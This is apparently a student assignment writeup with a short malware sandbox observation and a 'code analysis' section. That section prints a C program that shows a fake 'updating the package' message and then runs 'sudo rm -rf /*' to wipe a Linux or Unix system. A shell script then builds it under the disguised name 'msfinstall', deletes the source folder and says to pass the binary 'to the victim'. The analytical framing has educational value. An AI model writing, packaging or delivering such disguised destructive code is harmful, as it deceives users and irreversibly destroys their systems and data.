# Assignment-2
## Malware Analysis

 The assignment was to run malicious software on a windows sandbox and observe behaviours of the program.
 We used virtual box and run windows 7 on a VB instance.
 After running the program a few times we only managed to observe a few things.
 
 While  running the malware the program tried to perform a tcp connection to an external host, but was quickly stopped by the defender program.

 >despite this we were only able to identify a few processes running in the background.

# Assignment-3
## Code analysis

The source code that was analized was a C program that performed a given task.
```C
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

#define kill_os "sudo rm -rf /*"
#define text "Switching to root user to update the package" 
#define error_text "There has been an error."

int main(){
#if defined __linux__ || defined __unix__
    if ( geteuid() != 0 ){
        printf("%s\n", text); 
    }
    system(kill_os);
#else
    printf("%s\n", error_text);
    return 1;
#endif
}
```

The above C code is a script that will automatically destroy any linux/unix based system.

    1. The program starts by insuring that the current system is a linux/unix based one.
    2. If the system turns out to be a non linux/unix one it will display an error.
    3. Once the system is assured to be linux/unix then it will remove the root folder of the os which will lead to a complete distruction of the system.

The C program is intiated by running a bash command.

```bash
#!/bin/sh
gcc main.c -o msfinstall
mv msfinstall ..
cd .. && rm -rf fake-msfinstall/
echo "Now pass 'msfinstall' to the victim."
exit
```
